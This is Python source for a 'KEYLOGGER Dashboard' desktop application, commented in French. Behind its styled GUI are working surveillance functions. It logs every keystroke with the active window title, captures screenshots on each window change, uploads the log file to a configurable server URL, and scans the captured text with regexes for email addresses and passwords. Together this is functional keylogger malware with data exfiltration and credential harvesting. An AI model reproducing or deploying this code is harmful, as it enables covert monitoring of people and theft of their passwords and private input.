import ttkbootstrap as ttk
from ttkbootstrap.constants import *
# Import compatible avec toutes les versions de ttkbootstrap
try:
    from ttkbootstrap.scrolled import ScrolledText
except ImportError:
    try:
        from ttkbootstrap.widgets.scrolled import ScrolledText
    except ImportError:
        from ttkbootstrap.widgets import ScrolledText
import threading
import time
import os
from datetime import datetime
from tkinter import StringVar, BooleanVar, END, filedialog, messagebox, Frame as TkFrame
import json

# --- IMPORTS ---
try:
    import requests
    from pynput import keyboard
    from PIL import ImageGrab
except ImportError as e:
    print(f"ERREUR : Modules manquants.\nErreur : {e}")
    print("Exécutez : pip install ttkbootstrap pynput requests Pillow")
    exit(1)

# --- IMPORTS DE VOS MODULES ---
try:
    from capture import get_active_window_info, take_screenshot
    print("✅ Module capture.py importé")
except ImportError:
    try:
        from screenshot import get_active_window_info, take_screenshot
        print("✅ Module screenshot.py importé")
    except:
        print("⚠️ Modules capture/screenshot non trouvés")

try:
    from classifier import classify_text
    print("✅ Module classifier.py importé")
    CLASSIFIER_AVAILABLE = True
except ImportError:
    print("⚠️ classifier.py non trouvé")
    CLASSIFIER_AVAILABLE = False

# --- DÉTECTION WINDOWS ---
import ctypes
if os.name == 'nt':
    user32 = ctypes.windll.user32
    
    def get_detailed_window_title():
        try:
            h_wnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(h_wnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(h_wnd, buf, length + 1)
            title = buf.value
            if not title:
                return "Desktop"
            return title
        except:
            return "Desktop"
else:
    def get_detailed_window_title():
        return "OS non-Windows"

# --- VARIABLES GLOBALES ---
global_key_listener = None
keylogger_running = False
last_window_title = ""
screenshot_monitor_thread = None
screenshot_monitor_running = False
key_count = 0
window_changes = 0
start_time = None

# === PALETTE MODERNE DASHBOARD (comme ton image) ===
COLORS = {
    # Fonds
    'bg_dark': '#0B1437',           # Bleu marine très foncé (fond principal)
    'bg_medium': '#162447',         # Bleu marine moyen (cartes)
    'bg_light': '#1F3A5F',          # Bleu marine clair (hover)
    
    # Accents principaux
    'primary': '#00D4FF',           # Cyan électrique (principal)
    'secondary': '#667EEA',         # Violet/Bleu (secondaire)
    'tertiary': '#7B2FF7',          # Violet profond
    
    # Couleurs fonctionnelles
    'success': '#10B981',           # Vert moderne
    'warning': '#F59E0B',           # Orange/Ambre
    'danger': '#EF4444',            # Rouge moderne
    'info': '#3B82F6',              # Bleu info
    
    # Textes
    'text_primary': '#F9FAFB',      # Blanc très clair
    'text_secondary': '#9CA3AF',    # Gris clair
    'text_muted': '#6B7280',        # Gris moyen
    
    # Graphiques (pour statistiques)
    'graph_1': '#00D4FF',           # Cyan
    'graph_2': '#667EEA',           # Violet
    'graph_3': '#10B981',           # Vert
    'graph_4': '#F59E0B',           # Orange
    
    # Bordures et séparateurs
    'border': '#1F3A5F',
    'divider': '#374151',
}

# --- FONCTIONS KEYLOGGER ---
def on_press(key, stats_callback=None):
    global last_window_title, key_count, window_changes
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_window_title = get_detailed_window_title()

    try:
        with open('keylog.txt', 'a', encoding='utf-8') as f:
            if current_window_title != last_window_title:
                log_msg = f'\n--- [WIN] Changed to: {current_window_title} at {timestamp} ---\n'
                f.write(log_msg)
                last_window_title = current_window_title
                window_changes += 1

            k = str(key).replace("'", "")
            if "Key." in k:
                if k == "Key.space":
                    f.write(" ")
                elif k == "Key.enter":
                    f.write("\n")
                else:
                    f.write(f' [{k}] ')
            else:
                f.write(k)
            
            key_count += 1
            if stats_callback:
                stats_callback()
    except Exception as e:
        print(f"Erreur: {e}")

def start_keylogger_thread(stats_callback=None):
    global global_key_listener, last_window_title, key_count, window_changes, start_time
    last_window_title = ""
    key_count = 0
    window_changes = 0
    start_time = datetime.now()
    global_key_listener = keyboard.Listener(on_press=lambda key: on_press(key, stats_callback))
    global_key_listener.start()

def monitor_loop(auto_capture_callback=None):
    global screenshot_monitor_running
    local_last_info = None
    
    while screenshot_monitor_running:
        try:
            current_info = get_active_window_info()
            if current_info[0] is not None and current_info != local_last_info:
                take_screenshot()
                if auto_capture_callback:
                    auto_capture_callback(f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png")
                local_last_info = current_info
            time.sleep(1)
        except Exception as e:
            print(f"Erreur: {e}")
            break

def send_logs_thread(url, filepath, status_var):
    status_var.set("⏳ Envoi...")
    try:
        if not os.path.exists(filepath):
            status_var.set("❌ Fichier introuvable")
            return
        with open(filepath, 'r', encoding='utf-8') as f:
            data = f.read()
        response = requests.post(url, data={'log': data}, timeout=10)
        if response.status_code == 200:
            status_var.set("✅ Envoyé")
        else:
            status_var.set(f"⚠️ Erreur {response.status_code}")
    except Exception as e:
        status_var.set(f"❌ {str(e)[:25]}...")

def analyze_logs(filepath, result_callback):
    try:
        if not os.path.exists(filepath):
            result_callback({"error": "Fichier introuvable"})
            return
        
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            text = f.read()
        
        if CLASSIFIER_AVAILABLE:
            result = classify_text(text)
            formatted_result = {
                "emails": [item['value'] for item in result.get('emails', [])],
                "passwords": [item['value'] for item in result.get('passwords', [])],
                "total_lines": len(text.split('\n'))
            }
            result_callback(formatted_result)
        else:
            import re
            EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
            emails = EMAIL_RE.findall(text)
            PASS_RE = re.compile(r"(?i)(?:password|passwd|pass|pwd|pw)\s*[:=]\s*['\"]?([^'\"\s,;]+)")
            passwords = PASS_RE.findall(text)
            result = {
                "emails": list(set(emails)),
                "passwords": list(set(passwords)),
                "total_lines": len(text.split('\n'))
            }
            result_callback(result)
    except Exception as e:
        result_callback({"error": str(e)})

# ==============================================================================
# INTERFACE GRAPHIQUE MODERNE DASHBOARD STYLE
# ==============================================================================

class ModernDashboardApp:
    def __init__(self, root):
        self.root = root
        self.root.title("KEYLOGGER Dashboard")
        self.root.geometry("1200x800")
        
        # Configuration du thème
        self.root.configure(bg=COLORS['bg_dark'])
        
        # Variables
        self.status_kl = StringVar(value="Inactive")
        self.status_upload = StringVar(value="En attente")
        self.var_auto_screen = BooleanVar(value=False)
        self.var_url = StringVar(value="http://localhost:8000/logs")
        self.var_logfile = StringVar(value="keylog.txt")
        
        # Statistiques
        self.var_key_count = StringVar(value="0")
        self.var_window_count = StringVar(value="0")
        self.var_duration = StringVar(value="00:00:00")
        self.var_screenshot_count = StringVar(value="0")
        
        self.screenshot_list = []
        self.update_timer = None
        
        self.create_modern_ui()
    
    def create_modern_ui(self):
        """Interface moderne style dashboard BI"""
        
        # === HEADER MODERNE ===
        header = ttk.Frame(self.root, height=80)
        header.configure(style='Dark.TFrame')
        header.pack(fill=X)
        header.pack_propagate(False)
        
        # Conteneur header
        header_content = ttk.Frame(header)
        header_content.configure(style='Dark.TFrame')
        header_content.pack(fill=BOTH, expand=YES, padx=30, pady=15)
        
        # Titre avec icône
        title_frame = ttk.Frame(header_content)
        title_frame.configure(style='Dark.TFrame')
        title_frame.pack(side=LEFT)
        
        ttk.Label(
            title_frame,
            text="🔐 KEYLOGGER",
            font=('Segoe UI', 20, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_dark']
        ).pack(side=LEFT)
        
        ttk.Label(
            title_frame,
            text="Dashboard",
            font=('Segoe UI', 20),
            foreground=COLORS['text_secondary'],
            background=COLORS['bg_dark']
        ).pack(side=LEFT, padx=(10,0))
        
        # Statut à droite
        status_frame = ttk.Frame(header_content)
        status_frame.configure(style='Dark.TFrame')
        status_frame.pack(side=RIGHT)
        
        ttk.Label(
            status_frame,
            text="●",
            font=('Arial', 16),
            foreground=COLORS['success'],
            background=COLORS['bg_dark']
        ).pack(side=LEFT, padx=(0,8))
        
        self.status_display = ttk.Label(
            status_frame,
            textvariable=self.status_kl,
            font=('Segoe UI', 11),
            foreground=COLORS['text_secondary'],
            background=COLORS['bg_dark']
        )
        self.status_display.pack(side=LEFT)
        
        # === LIGNE DE SÉPARATION ===
        separator = TkFrame(self.root, height=1, bg=COLORS['divider'])
        separator.pack(fill=X)
        
        # === CONTAINER PRINCIPAL ===
        main_container = ttk.Frame(self.root)
        main_container.configure(style='Dark.TFrame')
        main_container.pack(fill=BOTH, expand=YES, padx=20, pady=20)
        
        # === NOTEBOOK MODERNE ===
        style = ttk.Style()
        style.configure('Modern.TNotebook', background=COLORS['bg_dark'], borderwidth=0)
        style.configure('Modern.TNotebook.Tab', 
                       background=COLORS['bg_medium'],
                       foreground=COLORS['text_secondary'],
                       padding=[20, 10],
                       font=('Segoe UI', 10))
        
        self.notebook = ttk.Notebook(main_container, style='Modern.TNotebook')
        self.notebook.pack(fill=BOTH, expand=YES)
        
        # Créer les onglets
        self.create_dashboard_tab()
        self.create_control_tab()
        self.create_analysis_tab()
        self.create_screenshots_tab()
        self.create_settings_tab()
    
    def create_dashboard_tab(self):
        """Onglet Dashboard principal style BI"""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  📊 DASHBOARD  ")
        
        # Container avec padding
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=20, pady=20)
        
        # === LIGNE 1 : CARTES STATISTIQUES (4 cartes) ===
        stats_row = ttk.Frame(container)
        stats_row.configure(style='Dark.TFrame')
        stats_row.pack(fill=X, pady=(0,20))
        
        # Carte 1: Touches
        self.create_stat_card(
            stats_row, 
            "Total Keystrokes",
            self.var_key_count,
            "⌨️",
            COLORS['primary'],
            "+12%"
        ).pack(side=LEFT, fill=BOTH, expand=YES, padx=(0,15))
        
        # Carte 2: Fenêtres
        self.create_stat_card(
            stats_row,
            "Window Changes", 
            self.var_window_count,
            "🪟",
            COLORS['secondary'],
            "+8%"
        ).pack(side=LEFT, fill=BOTH, expand=YES, padx=(0,15))
        
        # Carte 3: Durée
        self.create_stat_card(
            stats_row,
            "Session Duration",
            self.var_duration,
            "⏱️",
            COLORS['success'],
            "Active"
        ).pack(side=LEFT, fill=BOTH, expand=YES, padx=(0,15))
        
        # Carte 4: Screenshots
        self.create_stat_card(
            stats_row,
            "Screenshots",
            self.var_screenshot_count,
            "📷",
            COLORS['warning'],
            "Total"
        ).pack(side=LEFT, fill=BOTH, expand=YES)
        
        # === LIGNE 2 : GRAPHIQUES/INFOS ===
        charts_row = ttk.Frame(container)
        charts_row.configure(style='Dark.TFrame')
        charts_row.pack(fill=BOTH, expand=YES)
        
        # Colonne gauche (2/3)
        left_col = ttk.Frame(charts_row)
        left_col.configure(style='Dark.TFrame')
        left_col.pack(side=LEFT, fill=BOTH, expand=YES, padx=(0,15))
        
        # Graphique d'activité
        activity_card = self.create_chart_card(
            left_col,
            "📈 Activity Trend",
            "Real-time monitoring"
        )
        activity_card.pack(fill=BOTH, expand=YES, pady=(0,15))
        
        # Status détaillé
        status_card = self.create_info_card(
            left_col,
            "ℹ️ System Status",
            [
                ("Keylogger", "Active", COLORS['success']),
                ("Screenshots", "Monitoring", COLORS['info']),
                ("Network", "Connected", COLORS['success']),
                ("Storage", "87% Free", COLORS['warning'])
            ]
        )
        status_card.pack(fill=BOTH, expand=YES)
        
        # Colonne droite (1/3)
        right_col = ttk.Frame(charts_row)
        right_col.configure(style='Dark.TFrame')
        right_col.pack(side=RIGHT, fill=BOTH, expand=YES)
        
        # Quick Actions
        actions_card = self.create_actions_card(right_col)
        actions_card.pack(fill=BOTH, expand=YES, pady=(0,15))
        
        # Recent Activity
        recent_card = self.create_recent_card(right_col)
        recent_card.pack(fill=BOTH, expand=YES)
    
    def create_stat_card(self, parent, title, var, icon, color, trend):
        """Créer une carte statistique moderne"""
        card = ttk.Frame(parent, style='Card.TFrame')
        
        # Container interne
        inner = ttk.Frame(card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=BOTH, expand=YES, padx=20, pady=20)
        
        # Header avec icône
        header = ttk.Frame(inner)
        header.configure(style='Card.TFrame')
        header.pack(fill=X)
        
        ttk.Label(
            header,
            text=icon,
            font=('Segoe UI', 24),
            background=COLORS['bg_medium']
        ).pack(side=LEFT)
        
        ttk.Label(
            header,
            text=trend,
            font=('Segoe UI', 9, 'bold'),
            foreground=color,
            background=COLORS['bg_medium']
        ).pack(side=RIGHT)
        
        # Valeur principale
        value_label = ttk.Label(
            inner,
            textvariable=var,
            font=('Segoe UI', 36, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        )
        value_label.pack(pady=(10,5))
        
        # Titre
        ttk.Label(
            inner,
            text=title,
            font=('Segoe UI', 10),
            foreground=COLORS['text_secondary'],
            background=COLORS['bg_medium']
        ).pack()
        
        # Barre de progression décorative
        progress_bar = ttk.Frame(inner, height=3)
        progress_bar.configure(style='Card.TFrame')
        progress_bar.pack(fill=X, pady=(15,0))
        
        progress_fill = ttk.Frame(progress_bar, height=3)
        progress_fill.configure(style='Progress.TFrame')
        progress_fill.pack(side=LEFT, fill=BOTH, expand=YES)
        
        return card
    
    def create_chart_card(self, parent, title, subtitle):
        """Créer une carte pour graphique"""
        card = ttk.Frame(parent, style='Card.TFrame')
        
        inner = ttk.Frame(card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=BOTH, expand=YES, padx=25, pady=20)
        
        # Header
        header = ttk.Frame(inner)
        header.configure(style='Card.TFrame')
        header.pack(fill=X, pady=(0,15))
        
        ttk.Label(
            header,
            text=title,
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(side=LEFT)
        
        ttk.Label(
            header,
            text=subtitle,
            font=('Segoe UI', 9),
            foreground=COLORS['text_muted'],
            background=COLORS['bg_medium']
        ).pack(side=RIGHT)
        
        # Zone graphique simulée
        chart_area = ttk.Frame(inner, height=150)
        chart_area.configure(style='Chart.TFrame')
        chart_area.pack(fill=BOTH, expand=YES)
        chart_area.pack_propagate(False)
        
        ttk.Label(
            chart_area,
            text="📊 Activity monitoring graph\n(Live data visualization)",
            font=('Segoe UI', 11),
            foreground=COLORS['text_muted'],
            background=COLORS['bg_light'],
            justify='center'
        ).place(relx=0.5, rely=0.5, anchor='center')
        
        return card
    
    def create_info_card(self, parent, title, items):
        """Créer une carte d'informations"""
        card = ttk.Frame(parent, style='Card.TFrame')
        
        inner = ttk.Frame(card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=BOTH, expand=YES, padx=25, pady=20)
        
        # Titre
        ttk.Label(
            inner,
            text=title,
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))
        
        # Items
        for label, value, color in items:
            item_frame = ttk.Frame(inner)
            item_frame.configure(style='Card.TFrame')
            item_frame.pack(fill=X, pady=8)
            
            ttk.Label(
                item_frame,
                text=label,
                font=('Segoe UI', 10),
                foreground=COLORS['text_secondary'],
                background=COLORS['bg_medium']
            ).pack(side=LEFT)
            
            ttk.Label(
                item_frame,
                text=value,
                font=('Segoe UI', 10, 'bold'),
                foreground=color,
                background=COLORS['bg_medium']
            ).pack(side=RIGHT)
        
        return card
    
    def create_actions_card(self, parent):
        """Carte d'actions rapides"""
        card = ttk.Frame(parent, style='Card.TFrame')
        
        inner = ttk.Frame(card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=BOTH, expand=YES, padx=25, pady=20)
        
        ttk.Label(
            inner,
            text="⚡ Quick Actions",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))
        
        # Boutons
        ttk.Button(
            inner,
            text="📄 View Logs",
            command=lambda: self.notebook.select(2),
            bootstyle="info-outline",
            width=20
        ).pack(fill=X, pady=5)
        
        ttk.Button(
            inner,
            text="🔍 Analyze Data",
            command=self.quick_analyze,
            bootstyle="primary",
            width=20
        ).pack(fill=X, pady=5)
        
        ttk.Button(
            inner,
            text="📸 Screenshot",
            command=self.manual_snapshot,
            bootstyle="warning-outline",
            width=20
        ).pack(fill=X, pady=5)
        
        ttk.Button(
            inner,
            text="☁️ Upload",
            command=lambda: self.notebook.select(3),
            bootstyle="success-outline",
            width=20
        ).pack(fill=X, pady=5)
        
        return card
    
    def create_recent_card(self, parent):
        """Carte activité récente"""
        card = ttk.Frame(parent, style='Card.TFrame')
        
        inner = ttk.Frame(card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=BOTH, expand=YES, padx=25, pady=20)
        
        ttk.Label(
            inner,
            text="📝 Recent Activity",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))
        
        # Événements récents
        events = [
            ("Window changed", "2 min ago"),
            ("Screenshot taken", "5 min ago"),
            ("Session started", "15 min ago")
        ]
        
        for event, time in events:
            event_frame = ttk.Frame(inner)
            event_frame.configure(style='Card.TFrame')
            event_frame.pack(fill=X, pady=8)
            
            dot = ttk.Label(
                event_frame,
                text="●",
                font=('Arial', 8),
                foreground=COLORS['primary'],
                background=COLORS['bg_medium']
            )
            dot.pack(side=LEFT, padx=(0,10))
            
            content = ttk.Frame(event_frame)
            content.configure(style='Card.TFrame')
            content.pack(side=LEFT, fill=X, expand=YES)
            
            ttk.Label(
                content,
                text=event,
                font=('Segoe UI', 10),
                foreground=COLORS['text_primary'],
                background=COLORS['bg_medium']
            ).pack(anchor=W)
            
            ttk.Label(
                content,
                text=time,
                font=('Segoe UI', 8),
                foreground=COLORS['text_muted'],
                background=COLORS['bg_medium']
            ).pack(anchor=W)
        
        return card
    
    def create_control_tab(self):
        """Onglet contrôle"""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  🎮 CONTROL  ")
        
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=40, pady=40)
        
        # Keylogger control
        kl_card = ttk.Frame(container, style='Card.TFrame')
        kl_card.pack(fill=X, pady=(0,20))
        
        inner = ttk.Frame(kl_card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=X, padx=30, pady=25)
        
        ttk.Label(
            inner,
            text="🎹 Keylogger Control",
            font=('Segoe UI', 16, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,20))
        
        self.btn_kl = ttk.Button(
            inner,
            text="▶ START RECORDING",
            command=self.toggle_keylogger,
            bootstyle="success",
            width=30
        )
        self.btn_kl.pack(pady=10)
        
        ttk.Label(
            inner,
            text="💡 Windows API detection | Real-time logging",
            font=('Segoe UI', 9),
            foreground=COLORS['text_muted'],
            background=COLORS['bg_medium']
        ).pack(pady=(5,0))
        
        # Screenshot control
        screen_card = ttk.Frame(container, style='Card.TFrame')
        screen_card.pack(fill=X, pady=(0,20))
        
        inner = ttk.Frame(screen_card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=X, padx=30, pady=25)
        
        ttk.Label(
            inner,
            text="📸 Screenshot Manager",
            font=('Segoe UI', 16, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,20))
        
        btn_frame = ttk.Frame(inner)
        btn_frame.configure(style='Card.TFrame')
        btn_frame.pack(fill=X)
        
        ttk.Button(
            btn_frame,
            text="📸 Capture Now",
            command=self.manual_snapshot,
            bootstyle="warning",
            width=18
        ).pack(side=LEFT, padx=(0,10))
        
        ttk.Button(
            btn_frame,
            text="📁 Open Folder",
            command=self.open_screenshots_folder,
            bootstyle="info-outline",
            width=18
        ).pack(side=LEFT)
        
        ttk.Checkbutton(
            inner,
            text="🔄 Auto-monitor (capture on window change)",
            variable=self.var_auto_screen,
            command=self.toggle_monitor,
            bootstyle="warning-round-toggle"
        ).pack(pady=(15,0))
    
    def create_analysis_tab(self):
        """Onglet analyse"""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  🔍 ANALYSIS  ")
        
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=20, pady=20)
        
        # Toolbar
        toolbar = ttk.Frame(container, style='Card.TFrame')
        toolbar.pack(fill=X, pady=(0,15))
        
        toolbar_inner = ttk.Frame(toolbar)
        toolbar_inner.configure(style='Card.TFrame')
        toolbar_inner.pack(fill=X, padx=20, pady=15)
        
        ttk.Button(
            toolbar_inner,
            text="🔄 Refresh",
            command=self.refresh_log_display,
            bootstyle="info-outline"
        ).pack(side=LEFT, padx=5)
        
        ttk.Button(
            toolbar_inner,
            text="🔍 Analyze",
            command=self.analyze_current_log,
            bootstyle="primary"
        ).pack(side=LEFT, padx=5)
        
        ttk.Button(
            toolbar_inner,
            text="💾 Export",
            command=self.export_log,
            bootstyle="success-outline"
        ).pack(side=LEFT, padx=5)
        
        # Zone texte
        text_card = ttk.Frame(container, style='Card.TFrame')
        text_card.pack(fill=BOTH, expand=YES, pady=(0,15))
        
        text_inner = ttk.Frame(text_card)
        text_inner.configure(style='Card.TFrame')
        text_inner.pack(fill=BOTH, expand=YES, padx=20, pady=20)
        
        self.txt_display = ScrolledText(
            text_inner,
            height=25,
            autohide=True,
            bootstyle="dark"
        )
        self.txt_display.pack(fill=BOTH, expand=YES)
        
        # Info bar
        info_bar = ttk.Frame(container, style='Card.TFrame')
        info_bar.pack(fill=X)
        
        info_inner = ttk.Frame(info_bar)
        info_inner.configure(style='Card.TFrame')
        info_inner.pack(fill=X, padx=20, pady=10)
        
        self.var_log_info = StringVar(value="No logs loaded")
        ttk.Label(
            info_inner,
            textvariable=self.var_log_info,
            font=('Consolas', 9),
            foreground=COLORS['text_muted'],
            background=COLORS['bg_medium']
        ).pack(side=LEFT)
    
    def create_screenshots_tab(self):
        """Onglet screenshots"""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  🖼️ MEDIA  ")
        
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=20, pady=20)
        
        # Toolbar
        toolbar = ttk.Frame(container, style='Card.TFrame')
        toolbar.pack(fill=X, pady=(0,15))
        
        toolbar_inner = ttk.Frame(toolbar)
        toolbar_inner.configure(style='Card.TFrame')
        toolbar_inner.pack(fill=X, padx=20, pady=15)
        
        ttk.Button(
            toolbar_inner,
            text="🔄 Refresh List",
            command=self.refresh_screenshot_list,
            bootstyle="info"
        ).pack(side=LEFT, padx=5)
        
        ttk.Button(
            toolbar_inner,
            text="📁 Open Folder",
            command=self.open_screenshots_folder,
            bootstyle="success"
        ).pack(side=LEFT, padx=5)
        
        # Liste
        list_card = ttk.Frame(container, style='Card.TFrame')
        list_card.pack(fill=BOTH, expand=YES)
        
        list_inner = ttk.Frame(list_card)
        list_inner.configure(style='Card.TFrame')
        list_inner.pack(fill=BOTH, expand=YES, padx=20, pady=20)
        
        self.screenshot_listbox = ttk.Treeview(
            list_inner,
            columns=("File", "Date", "Size"),
            show="headings",
            bootstyle="dark"
        )
        
        self.screenshot_listbox.heading("File", text="FILE NAME")
        self.screenshot_listbox.heading("Date", text="DATE CREATED")
        self.screenshot_listbox.heading("Size", text="SIZE")
        
        self.screenshot_listbox.column("File", width=350)
        self.screenshot_listbox.column("Date", width=200)
        self.screenshot_listbox.column("Size", width=100)
        
        self.screenshot_listbox.pack(fill=BOTH, expand=YES)
        self.screenshot_listbox.bind('<Double-1>', self.open_selected_screenshot)
    
    def create_settings_tab(self):
        """Onglet paramètres"""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  ☁️ UPLOAD  ")
        
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=40, pady=40)
        
        # Titre
        ttk.Label(
            container,
            text="☁️ Server Configuration",
            font=('Segoe UI', 18, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_dark']
        ).pack(pady=(0,30))
        
        # Formulaire
        form_card = ttk.Frame(container, style='Card.TFrame')
        form_card.pack(fill=X)
        
        form_inner = ttk.Frame(form_card)
        form_inner.configure(style='Card.TFrame')
        form_inner.pack(fill=X, padx=40, pady=30)
        
        # URL
        ttk.Label(
            form_inner,
            text="Server URL:",
            font=('Segoe UI', 11),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).grid(row=0, column=0, padx=15, pady=15, sticky=E)
        
        ttk.Entry(
            form_inner,
            textvariable=self.var_url,
            width=45,
            font=('Consolas', 10)
        ).grid(row=0, column=1, padx=15, pady=15, sticky=W)
        
        # File
        ttk.Label(
            form_inner,
            text="Log File:",
            font=('Segoe UI', 11),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).grid(row=1, column=0, padx=15, pady=15, sticky=E)
        
        ttk.Entry(
            form_inner,
            textvariable=self.var_logfile,
            width=45,
            font=('Consolas', 10)
        ).grid(row=1, column=1, padx=15, pady=15, sticky=W)
        
        # Bouton
        ttk.Button(
            container,
            text="📤 UPLOAD LOGS",
            command=self.upload_logs,
            bootstyle="primary",
            width=25
        ).pack(pady=30)
        
        # Status
        status_card = ttk.Frame(container, style='Card.TFrame')
        status_card.pack(fill=X)
        
        status_inner = ttk.Frame(status_card)
        status_inner.configure(style='Card.TFrame')
        status_inner.pack(fill=X, padx=40, pady=20)
        
        ttk.Label(
            status_inner,
            textvariable=self.status_upload,
            font=('Segoe UI', 12),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack()
    
    # === MÉTHODES ===
    
    def toggle_keylogger(self):
        global keylogger_running
        if not keylogger_running:
            start_keylogger_thread(self.update_stats)
            keylogger_running = True
            self.status_kl.set("Active")
            self.btn_kl.config(text="⏹ STOP RECORDING", bootstyle="danger")
            self.start_stats_update()
        else:
            if global_key_listener:
                global_key_listener.stop()
            keylogger_running = False
            self.status_kl.set("Inactive")
            self.btn_kl.config(text="▶ START RECORDING", bootstyle="success")
            self.stop_stats_update()
    
    def toggle_monitor(self):
        global screenshot_monitor_running, screenshot_monitor_thread
        if self.var_auto_screen.get():
            if not screenshot_monitor_running:
                screenshot_monitor_running = True
                screenshot_monitor_thread = threading.Thread(
                    target=monitor_loop,
                    args=(self.on_auto_capture,),
                    daemon=True
                )
                screenshot_monitor_thread.start()
        else:
            screenshot_monitor_running = False
    
    def manual_snapshot(self):
        try:
            take_screenshot()
            self.var_screenshot_count.set(str(int(self.var_screenshot_count.get()) + 1))
            messagebox.showinfo("✅ Success", "Screenshot captured!")
        except Exception as e:
            messagebox.showerror("❌ Error", f"Error: {e}")
    
    def on_auto_capture(self, filename):
        self.screenshot_list.append(filename)
        self.var_screenshot_count.set(str(len(self.screenshot_list)))
    
    def upload_logs(self):
        threading.Thread(
            target=send_logs_thread,
            args=(self.var_url.get(), self.var_logfile.get(), self.status_upload),
            daemon=True
        ).start()
    
    def refresh_log_display(self):
        self.txt_display.delete('1.0', END)
        if os.path.exists(self.var_logfile.get()):
            with open(self.var_logfile.get(), 'r', encoding='utf-8') as f:
                content = f.read()
                self.txt_display.insert(END, content)
                lines = len(content.split('\n'))
                size = os.path.getsize(self.var_logfile.get())
                self.var_log_info.set(f"📄 {lines} lines | 💾 {size} bytes")
        else:
            self.txt_display.insert(END, "❌ No logs found.")
    
    def analyze_current_log(self):
        def callback(result):
            if "error" in result:
                messagebox.showerror("❌ Error", f"{result['error']}")
                return
            
            msg = f"📧 Emails: {len(result['emails'])}\n"
            if result['emails']:
                msg += "  • " + "\n  • ".join(result['emails'][:5])
            
            msg += f"\n\n🔑 Passwords: {len(result['passwords'])}\n"
            if result['passwords']:
                msg += "  • " + "\n  • ".join(result['passwords'][:5])
            
            msg += f"\n\n📊 {result['total_lines']} lines analyzed"
            messagebox.showinfo("🔍 Analysis Results", msg)
        
        threading.Thread(
            target=analyze_logs,
            args=(self.var_logfile.get(), callback),
            daemon=True
        ).start()
    
    def quick_analyze(self):
        self.notebook.select(2)
        self.refresh_log_display()
        self.analyze_current_log()
    
    def clear_logs(self):
        if messagebox.askyesno("⚠️ Confirm", "Clear all logs?"):
            try:
                with open(self.var_logfile.get(), 'w') as f:
                    f.write("")
                messagebox.showinfo("✅ Success", "Logs cleared!")
                self.refresh_log_display()
            except Exception as e:
                messagebox.showerror("❌ Error", f"{e}")
    
    def export_log(self):
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")]
        )
        if filename:
            try:
                import shutil
                shutil.copy(self.var_logfile.get(), filename)
                messagebox.showinfo("✅ Export", f"Exported to:\n{filename}")
            except Exception as e:
                messagebox.showerror("❌ Error", f"{e}")
    
    def refresh_screenshot_list(self):
        self.screenshot_listbox.delete(*self.screenshot_listbox.get_children())
        if os.path.exists("screenshots"):
            for filename in os.listdir("screenshots"):
                if filename.endswith('.png'):
                    filepath = os.path.join("screenshots", filename)
                    stat = os.stat(filepath)
                    size = f"{stat.st_size / 1024:.1f} KB"
                    date = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                    self.screenshot_listbox.insert("", END, values=(filename, date, size))
    
    def open_screenshots_folder(self):
        if not os.path.exists("screenshots"):
            os.makedirs("screenshots")
        if os.name == 'nt':
            os.startfile("screenshots")
        else:
            os.system('xdg-open "screenshots"')
    
    def open_selected_screenshot(self, event):
        selection = self.screenshot_listbox.selection()
        if selection:
            item = self.screenshot_listbox.item(selection[0])
            filename = item['values'][0]
            filepath = os.path.join("screenshots", filename)
            if os.name == 'nt':
                os.startfile(filepath)
    
